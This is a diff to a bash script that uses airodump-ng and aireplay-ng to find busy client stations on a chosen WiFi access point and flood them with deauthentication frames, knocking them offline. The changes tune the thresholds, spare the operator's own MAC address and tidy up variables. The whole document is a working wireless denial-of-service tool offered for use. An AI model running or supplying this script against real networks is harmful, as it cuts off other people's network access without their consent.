@@ -44,8 +44,8 @@ ENDINFO
 ##### Basic config #####
 # how long to run airodump for to analyze situation (default: 5)
 waitsecs=5
-# threshold that a station must exceed for us to boot it off the wifi (defauult: 50)
-packetthresh=50
+# threshold that a station must exceed for us to boot it off the wifi (default: 200)
+packetthresh=200
 # numeric wifi channel
 channel=3
 # What is the BSSID that we're booting people off of?
@@ -57,7 +57,7 @@ wlaninterface='wlan0'
 
 ##### Advanced config (shouldn't need to mess with this) #####
 # how many deauth frames do you want to send to each MAC?
-deauthframes=100
+deauthframes=10
 # what is the exact name of the CSV file that we should parse?  HINT: Leave this alone if you don't know what you're doing
 csvfile='airodump-temp-01.csv'
 # Pattern for the CSV file that we'll pass to airodump.  See above hint/warning.
@@ -90,10 +90,28 @@ cleanup ()
     else
         printf 'Temp CSV not found...\n'
     fi
+    printf 'Cleaning up variables...\n'
+    cleanvars
     printf 'Done cleaning up.  Thank you, come again!\n'
     exit 2
 }
 
+cleanvars ()
+{
+    unset waitsecs
+    unset packetthresh
+    unset channel
+    unset bssid
+    unset moninterface
+    unset wlaninterface
+    unset deauthframes
+    unset csvfile
+    unset csvpattern
+    unset wlanmac
+    unset stations
+    unset i
+    unset x
+}
 ##### MAIN #####
 
 # Very first, make sure we are running as root
@@ -107,11 +125,15 @@ trap cleanup INT
 #// ...but then we can't really grep for it before hand...
 #// Possible solution is to figure out all the names a mon interface could be.
 
+# figure out our MAC so we don't commit seppuku
+wlanmac=$(ifconfig "${wlaninterface}" | awk '/HWaddr/{print $NF}')
+
 # look for the monitor interface and start it if it doesn't already exist
 ifconfig |grep "${moninterface}" || airmon-ng start "${wlaninterface}"
 
 # remove CSV files matching the pattern (disable for testing)
-#rm -rf "${csvpattern}"*.csv
+ls -la "${csvpattern}"*.csv && rm -rf "${csvpattern}"*.csv
+ls -la "${csvfie}" && rm -rf "${csvfile}"
 
 # run airodump IN THE BACKGROUND (otherwise it'll block and we can't 'sleep' ...
 #...on the mon interface and limit to the BSSID and channel specified ...
@@ -124,30 +146,48 @@ sleep "${waitsecs}"
 # airodump will run as a "background" process but it'll appear in the foreground...
 # ...on the screen.  Kill it after waiting for it to gather data.
 killall airodump-ng
-printf 'Listing MACs that are about to get a stack of deauth frames :)\n'
+clear
+printf 'Listing MACs that are about to get a stack of deauth frames in 3 seconds...\r\n'
 
 # set the field seperator (-F) to ',' (comma) since we're parsing a CSV file ...
 # ...set the awk variable 'p' to the same as the bash variable '$packetthresh' ...
 # ...match the regex '/Station/' then go to the next line (because the '/Station'/ ...
 # ...line is just column headers), then see if the 5th column (packet count) is ...
 # ...greater than [$packetthresh].  If it is, print the number of packets and ...
-# ...the MAC from the CSV file.
-awk -F, -v p=$packetthresh '/Station/ {i=1; next} i && $5 > p {print "Packets:"$5,"--- MAC:",$1}' "${csvfile}"
+# ...the MAC from the CSV file.  Exclude our MAC to avoid seppuku.
+awk -F, -v p=${packetthresh} '/Station/ {i=1; next} i && $5 > p {print "Packets:"$5,"--- MAC:",$1}' "${csvfile}" |grep -v "${wlanmac}"
+sleep 3
+
+stations=$(awk -F, -v p=${packetthresh} '/Station/ {i=1; next} i && $5 > p {print $1}' "${csvfile}"| grep -v "${wlanmac}")
+
+# print the stations list so we can make sure that it's the same as above
+# TODO: improve this so we only have *ONE* awk expression since having two makes this way harder to maintain
+#echo $stations
 
 # for each MAC in basically the above AWK stuff without the pretty printing ...
-for i in $(awk -F, 'NR > 5 && $5 > 50 {print $1}' airodump-temp-01.csv); do
-
+for station in $stations; do
 # ...run aireplay and send however many deauth frames to each MAC ...
 # ...Do this to all MACs at the same time by backgrounding all processes ...
 # ...it's basically ghetto threading :)
-    aireplay-ng -D --deauth "${deauthframes}" "${moninterface}" -a "${bssid}" -s "${bssid}" -c "${i}" &
+    aireplay-ng -D --deauth "${deauthframes}" "${moninterface}" -a "${bssid}" -s "${bssid}" -c "${station}" &
 done
 
+
+#for i in $(awk -F, 'NR > 5 && $5 > 50 {print $1}' "${csvfile}"| grep -v "${wlanmac}"); do
+# ...run aireplay and send however many deauth frames to each MAC ...
+# ...Do this to all MACs at the same time by backgrounding all processes ...
+# ...it's basically ghetto threading :)
+#    aireplay-ng -D --deauth "${deauthframes}" "${moninterface}" -a "${bssid}" -s "${bssid}" -c "${i}" &
+#done
+
 # wait for all the aireplay-ng processes to finish before exiting the script
+# we need this so we can kill them upon ^c
 for x in $(pidof aireplay-ng); do
     wait "${x}"
 done
-echo "$0 Done"
+printf "$0 Done\n"
+
+cleanvars
 
 # quit and return a valid exit status
 exit 0
